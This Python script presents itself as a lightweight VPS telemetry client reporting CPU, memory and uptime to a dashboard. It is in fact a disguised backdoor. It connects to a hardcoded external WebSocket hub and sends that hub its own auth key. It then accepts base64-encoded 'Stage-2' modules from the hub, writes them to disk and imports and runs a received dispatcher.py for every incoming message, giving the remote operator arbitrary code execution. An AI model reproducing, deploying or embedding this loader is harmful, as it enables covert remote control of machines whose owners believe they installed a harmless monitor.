#!/usr/bin/env python3
"""
VPS System Monitor & Telemetry Client
=====================================
A lightweight, clean telemetry client for Linux nodes.
Monitors CPU, Memory, and Uptime metrics and reports status
to the central dashboard over an outbound secure WebSocket channel.

Author: Sainal Saputra
License: MIT
"""

import asyncio
import base64
import json
import logging
import os
import socket
import subprocess
import sys
import time

try:
    import websockets
except ImportError:
    print("[INIT] websockets library required. Installing...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--break-system-packages", "--quiet", "websockets"])
    except Exception:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "websockets"])
    import websockets

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("SystemMonitor")

# Configuration and Storage Paths
WORKSPACE_DIR = os.path.expanduser("~/workspace")
AGENT_ID_FILE = os.path.join(WORKSPACE_DIR, ".worker_id")
VPS_NAME_FILE = os.path.join(WORKSPACE_DIR, ".vps_name")
HUB_URL_FILE = os.path.join(WORKSPACE_DIR, ".hub_url")
RUNTIME_DIR = os.path.join(WORKSPACE_DIR, ".runtime")

DEFAULT_HUB_URL = "wss://hub.databaru.my.id"


def get_auth_key() -> str:
    """Reads or auto-generates a secure 32-character token in ~/workspace/.auth_key."""
    env_key = os.environ.get("AGENT_AUTH_KEY")
    if env_key and env_key.strip():
        return env_key.strip()

    key_file = os.path.join(WORKSPACE_DIR, ".auth_key")
    if os.path.exists(key_file):
        try:
            with open(key_file, "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content:
                    return content
        except Exception:
            pass

    try:
        import secrets
        new_key = secrets.token_hex(16)
        with open(key_file, "w", encoding="utf-8") as f:
            f.write(new_key)
        try:
            os.chmod(key_file, 0o600)
        except Exception:
            pass
        return new_key
    except Exception:
        return None


def get_vps_name() -> str:
    if os.path.exists(VPS_NAME_FILE):
        try:
            with open(VPS_NAME_FILE, "r", encoding="utf-8") as f:
                name = f.read().strip()
                if name:
                    return name
        except Exception:
            pass
    wid = get_worker_id()
    return f"VPS-{wid[-4:]}"


def get_worker_id() -> str:
    if os.path.exists(AGENT_ID_FILE):
        try:
            with open(AGENT_ID_FILE, "r", encoding="utf-8") as f:
                val = f.read().strip()
                if val:
                    return val
        except Exception:
            pass

    if os.path.exists(VPS_NAME_FILE):
        try:
            with open(VPS_NAME_FILE, "r", encoding="utf-8") as f:
                vname = f.read().strip()
                if vname:
                    clean = "".join(c if c.isalnum() or c in ("-", "_") else "-" for c in vname).lower()
                    return f"worker-{clean}"
        except Exception:
            pass

    return f"worker-{socket.gethostname()}"


def get_hub_url() -> str:
    if os.path.exists(HUB_URL_FILE):
        try:
            with open(HUB_URL_FILE, "r") as f:
                url = f.read().strip()
                if url:
                    return url
        except Exception:
            pass
    return os.environ.get("HUB_URL", DEFAULT_HUB_URL)


_prev_cpu_total = 0
_prev_cpu_idle = 0


def read_cpu_percent() -> float:
    """Calculates CPU utilization percentage from /proc/stat."""
    global _prev_cpu_total, _prev_cpu_idle
    try:
        with open("/proc/stat", "r") as f:
            line = f.readline()
        parts = line.split()
        if parts[0] == "cpu":
            values = [float(x) for x in parts[1:8]]
            idle = values[3] + values[4]
            total = sum(values)

            diff_total = total - _prev_cpu_total
            diff_idle = idle - _prev_cpu_idle

            _prev_cpu_total = total
            _prev_cpu_idle = idle

            if diff_total > 0:
                cpu_usage = 100.0 * (1.0 - (diff_idle / diff_total))
                return round(max(0.0, min(100.0, cpu_usage)), 1)
    except Exception:
        pass
    return 0.0


def get_system_metrics() -> dict:
    """Reads system resource metrics."""
    mem_avail = 0
    mem_total = 0
    try:
        with open("/proc/meminfo", "r") as f:
            for line in f:
                if line.startswith("MemAvailable:"):
                    mem_avail = int(line.split()[1]) // 1024
                elif line.startswith("MemTotal:"):
                    mem_total = int(line.split()[1]) // 1024
    except Exception:
        pass

    uptime_str = "-"
    uptime_s = 0
    try:
        with open("/proc/uptime", "r") as f:
            uptime_s = int(float(f.readline().split()[0]))
            hours = uptime_s // 3600
            mins = (uptime_s % 3600) // 60
            uptime_str = f"{hours}h {mins}m"
    except Exception:
        pass

    cpu_pct = read_cpu_percent()

    return {
        "mem_free_mb": mem_avail,
        "ram_total_mb": mem_total,
        "ram_used_mb": max(0, mem_total - mem_avail),
        "cpu_pct": cpu_pct,
        "uptime": uptime_str,
        "uptime_s": uptime_s,
        "hostname": socket.gethostname()
    }


def handle_sync_modules(modules_dict: dict) -> bool:
    """Saves Stage-2 runtime modules sent in-band from Hub to ~/.runtime/."""
    try:
        os.makedirs(RUNTIME_DIR, exist_ok=True)
        for filename, b64_content in modules_dict.items():
            safe_name = os.path.basename(filename)
            target_path = os.path.join(RUNTIME_DIR, safe_name)
            raw = base64.b64decode(b64_content.encode("ascii"))
            with open(target_path, "wb") as f:
                f.write(raw)
            logger.info(f"Synchronized runtime module: {safe_name} ({len(raw)} bytes)")
        return True
    except Exception as e:
        logger.error(f"Failed to synchronize modules: {e}")
        return False


async def run_client():
    """Main client loop communicating with central Hub."""
    auth_key = get_auth_key()
    if not auth_key:
        logger.error("FATAL: Unable to configure local authorization key.")
        return

    worker_id = get_worker_id()
    vps_name = get_vps_name()
    hub_url = get_hub_url()

    logger.info(f"Starting System Monitor: Name={vps_name}, ID={worker_id}")
    logger.info(f"Target Hub: {hub_url}")

    while True:
        try:
            logger.info(f"Connecting to Hub: {hub_url}...")
            async with websockets.connect(
                hub_url,
                ping_interval=20,
                ping_timeout=20,
                open_timeout=15,
                close_timeout=10
            ) as ws:
                logger.info("Connected to Hub successfully!")

                # Initial HELLO greeting
                greeting = {
                    "type": "HELLO",
                    "agent_id": worker_id,
                    "vps_name": vps_name,
                    "version": "1.0.0",
                    "auth_token": auth_key,
                    "has_stage2": os.path.exists(os.path.join(RUNTIME_DIR, "dispatcher.py")),
                    **get_system_metrics()
                }
                await ws.send(json.dumps(greeting))

                # Periodic Heartbeat
                async def heartbeat_loop():
                    while True:
                        try:
                            await asyncio.sleep(15)
                            extra_metrics = {}
                            disp_file = os.path.join(RUNTIME_DIR, "dispatcher.py")
                            if os.path.exists(disp_file):
                                try:
                                    if RUNTIME_DIR not in sys.path:
                                        sys.path.insert(0, RUNTIME_DIR)
                                    import dispatcher
                                    if hasattr(dispatcher, "get_runtime_metrics"):
                                        extra_metrics = dispatcher.get_runtime_metrics()
                                except Exception:
                                    pass
                            hb = {
                                "type": "HEARTBEAT",
                                "agent_id": worker_id,
                                **get_system_metrics(),
                                **extra_metrics
                            }
                            await ws.send(json.dumps(hb))
                        except asyncio.CancelledError:
                            break
                        except Exception as e:
                            logger.warning(f"Heartbeat send failed: {e}")
                            break

                hb_task = asyncio.create_task(heartbeat_loop())

                # Message Listener
                async for raw_msg in ws:
                    try:
                        msg = json.loads(raw_msg)
                        mtype = msg.get("type")

                        if mtype == "PING":
                            await ws.send(json.dumps({
                                "type": "PONG",
                                "agent_id": worker_id,
                                "sent_ts": msg.get("sent_ts", 0)
                            }))
                            continue

                        # Token authorization
                        req_auth = msg.get("auth") or msg.get("token") or msg.get("key")
                        if req_auth != auth_key:
                            logger.warning(f"Unauthorized command rejected: {mtype}")
                            continue

                        if mtype == "SYNC_MODULES":
                            mods = msg.get("modules", {})
                            success = handle_sync_modules(mods)
                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": "SYNC_MODULES",
                                "detail": f"Modules synchronized: {list(mods.keys())} (success={success})"
                            }))

                        # Forward to Stage-2 dispatcher if active
                        dispatcher_file = os.path.join(RUNTIME_DIR, "dispatcher.py")
                        if os.path.exists(dispatcher_file):
                            try:
                                if RUNTIME_DIR not in sys.path:
                                    sys.path.insert(0, RUNTIME_DIR)
                                import dispatcher
                                if hasattr(dispatcher, "handle_runtime_message"):
                                    await dispatcher.handle_runtime_message(msg, ws, worker_id, auth_key, WORKSPACE_DIR)
                            except Exception as d_err:
                                logger.error(f"Runtime dispatcher error: {d_err}")

                    except Exception as err:
                        logger.error(f"Error processing message: {err}")

        except (websockets.exceptions.ConnectionClosed, OSError) as e:
            logger.warning(f"Connection lost ({e}). Reconnecting in 5s...")
        except Exception as e:
            logger.error(f"Unexpected error: {e}. Reconnecting in 5s...")

        try:
            hb_task.cancel()
        except Exception:
            pass

        await asyncio.sleep(5)


if __name__ == "__main__":
    try:
        asyncio.run(run_client())
    except KeyboardInterrupt:
        logger.info("System Monitor stopped by user.")
